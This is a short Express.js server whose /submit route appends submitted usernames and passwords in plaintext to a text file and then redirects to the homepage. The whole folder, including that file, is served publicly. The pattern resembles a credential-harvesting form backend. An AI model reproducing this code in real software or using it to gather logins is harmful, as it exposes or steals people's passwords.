const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Parse form bodies
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from the workspace folder
app.use(express.static(__dirname));

app.post('/submit', (req, res) => {
  const { username = '', password = '', remember } = req.body;
  const timestamp = new Date().toISOString();
  const line = `timestamp=${timestamp} | usuario=${username} | password=${password} | remember=${remember ? 'true' : 'false'}\n`;

  const outFile = path.join(__dirname, 'submissions.txt');
  try {
    fs.appendFileSync(outFile, line, 'utf8');
  } catch (err) {
    console.error('Error guardando envío:', err);
  }

  // Return to the homepage after submission
  res.redirect('/');
});

app.listen(PORT, () => {
  console.log(`Servidor iniciado en http://localhost:${PORT}`);
});
